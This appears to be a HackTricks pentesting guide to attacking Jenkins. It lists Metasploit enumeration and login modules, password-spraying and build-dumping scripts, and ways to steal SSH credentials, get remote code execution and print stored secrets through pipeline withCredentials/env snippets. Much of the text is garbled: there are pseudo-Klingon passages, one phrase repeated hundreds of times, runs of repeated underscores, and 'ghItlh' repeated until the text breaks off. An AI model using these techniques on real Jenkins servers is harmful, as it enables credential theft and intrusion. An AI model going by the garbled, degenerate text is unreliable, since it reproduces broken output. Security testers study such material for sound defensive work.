# Jenkins Security

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Basic Information

Jenkins vItlhutlh offers a straightforward method for establishing a **continuous integration** or **continuous delivery** (CI/CD) environment for almost **any** combination of **programming languages** and source code repositories using pipelines. Furthermore, it automates various routine development tasks. While Jenkins doesn't eliminate the **need to create scripts for individual steps**, it does provide a faster and more robust way to integrate the entire sequence of build, test, and deployment tools than one can easily construct manually.


{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Unauthenticated Enumeration

In order to search for interesting Jenkins pages without authentication like (_/people_ or _/asynchPeople_, this lists the current users) you can use:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
### Check if you can execute commands without needing authentication:

### qaStaHvIS 'ejatlh 'e' vItlhutlh:

```bash
$ curl -X GET http://<jenkins-url>/cli/
```

If you receive a response without requiring authentication, it means that you can execute commands without needing to authenticate.

vaj jImej qaStaHvIS, 'ejatlh 'e' vItlhutlh, 'ach vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj vItlhutlhbe'chugh, vaj
```
msf> use auxiliary/scanner/http/jenkins_command
```
**/asynchPeople/**_ path or _**/securityRealm/user/admin/search/index?q=**_ for **usernames**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_**_
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Password spraying

Use [this python script](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) or [this powershell script](https://github.com/chryzsh/JenkinsPasswordSpray).

### IP Whitelisting Bypass

Many organizations combine **SaaS-based source control management (SCM) systems** such as GitHub or GitLab with an **internal, self-hosted CI** solution like Jenkins or TeamCity. This setup allows CI systems to **receive webhook events from SaaS source control vendors**, primarily for triggering pipeline jobs.

To achieve this, organizations **whitelist** the **IP ranges** of the **SCM platforms**, permitting them to access the **internal CI system** via **webhooks**. However, it's important to note that **anyone** can create an **account** on GitHub or GitLab and configure it to **trigger a webhook**, potentially sending requests to the **internal CI system**.


Check:
[shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Internal Jenkins Abuses

In these scenarios we are going to suppose you have a valid account to access Jenkins.

{% hint style="warning" %}
Depending on the **Authorization** mechanism configured in Jenkins and the permission of the compromised user you **might be able or not to perform the following attacks.**
{% endhint %}

For more information check the basic information:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listing users

If you have accessed Jenkins you can list other registered users in [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Dumping builds to find cleartext secrets

Use [this script](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py) to dump build console outputs and build environment variables to hopefully find cleartext secrets.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **Stealing SSH Credentials**

If the compromised user has **enough privileges to create/modify a new Jenkins node** and SSH credentials are already stored to access other nodes, he could **steal those credentials** by creating/modifying a node and **setting a host that will record the credentials** without verifying the host key:

![](<../../.gitbook/assets/image (56).png>)

You will usually find Jenkins ssh credentials in a **global provider** (`/credentials/`), so you can also dump them as you would dump any other secret. More information in the [**Dumping secrets section**](./#dumping-secrets).

### **RCE in Jenkins**

Getting a **shell in the Jenkins server** gives the attacker the opportunity to leak all the **secrets** and **env variables** and to **exploit other machines** located in the same network or even **gather cloud credentials**.

By default, Jenkins will **run as SYSTEM**. So, compromising it will give the attacker **SYSTEM privileges**.

### **RCE Creating/Modifying a project**

Creating/Modifying a project is a way to obtain RCE over the Jenkins server:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE Execute Groovy script**

You can also obtain RCE executing a Groovy script, which might my stealthier than creating a new project:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Creating/Modifying Pipeline

You can also get **RCE by creating/modifying a pipeline**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Pipeline Exploitation

To exploit pipelines you still need to have access to Jenkins.

### Build Pipelines

**Pipelines** can also be used as **build mechanism in projects**, in that case it can be configured a **file inside the repository** that will contains the pipeline syntax. By default `/Jenkinsfile` is used:

![](<../../.gitbook/assets/image (14) (1) (1).png>)

It's also possible to **store pipeline configuration files in other places** (in other repositories for example) with the goal of **separating** the repository **access** and the pipeline access.

If an attacker have **write access over that file** he will be able to **modify** it and **potentially trigger** the pipeline without even having access to Jenkins.\
It's possible that the attacker will need to **bypass some branch protections** (depending on the platform and the user privileges they could be bypassed or not).

The most common triggers to execute a custom pipeline are:

* **Pull request** to the main branch (or potentially to other branches)
* **Push to the main branch** (or potentially to other branches)
* **Update the main branch** and wait until it's executed somehow

{% hint style="info" %}
If you are an **external user** you shouldn't expect to create a **PR to the main branch** of the repo of **other user/organization** and **trigger the pipeline**... but if it's **bad configured** you could fully **compromise companies just by exploiting this**.
{% endhint %}

### Pipeline RCE

In the previous RCE section it was already indicated a technique to [**get RCE modifying a pipeline**](./#rce-creating-modifying-pipeline).

### Checking Env variables

It's possible to declare **clear text env variables** for the whole pipeline or for specific stages. This env variables **shouldn't contain sensitive info**, but and attacker could always **check all the pipeline** configurations/Jenkinsfiles:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### qo'wI' 'ej qorDu'

Jenkins Daq 'ejwI' jatlhlaHbe'chugh **secrets** Daq **qorDu'** **providers** (`/credentials/`) **ghap** **projects** (`/job/<project-name>/configure`) **ghap** **scoped** **qorDu'** **exfiltrate** **need** **compromise** **projects** **ghap** **execute** **custom/poisoned pipelines**.

**QaH**, **secret** **env** **pipeline** **qorDu'** **name** **type** **know** **need**. **Example**, **load** **`usernamePassword`** **secret** **`string`** **secret** **error** **get** **will**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
# tlhIngan Hol

DaH jImej:
- **Username/Password**: `usernamePassword` jImejDaq `credentials` jImejDaq `username` je `password` jImejmeyDaq.
- **Secret Text**: `secretText` jImejDaq `credentials` jImejDaq `secret` jImejmeyDaq.
- **Secret File**: `secretFile` jImejDaq `credentials` jImejDaq `file` jImejmeyDaq.
- **SSH Username with Private Key**: `sshUserPrivateKey` jImejDaq `credentials` jImejDaq `username` je `privateKey` jImejmeyDaq.
- **AWS Credentials**: `awsCredentials` jImejDaq `credentials` jImejDaq `accessKey` je `secretKey` jImejmeyDaq.
- **Google Service Account**: `googleRobotCredentials` jImejDaq `credentials` jImejDaq `jsonKey` jImejmeyDaq.
- **Username/Password (Deprecated)**: `usernamePasswordDeprecated` jImejDaq `credentials` jImejDaq `username` je `password` jImejmeyDaq.

# English

Here you have the way to load some common secret types:
- **Username/Password**: `usernamePassword` in the `credentials` file with `username` and `password` fields.
- **Secret Text**: `secretText` in the `credentials` file with `secret` field.
- **Secret File**: `secretFile` in the `credentials` file with `file` field.
- **SSH Username with Private Key**: `sshUserPrivateKey` in the `credentials` file with `username` and `privateKey` fields.
- **AWS Credentials**: `awsCredentials` in the `credentials` file with `accessKey` and `secretKey` fields.
- **Google Service Account**: `googleRobotCredentials` in the `credentials` file with `jsonKey` field.
- **Username/Password (Deprecated)**: `usernamePasswordDeprecated` in the `credentials` file with `username` and `password` fields.
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
**ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** 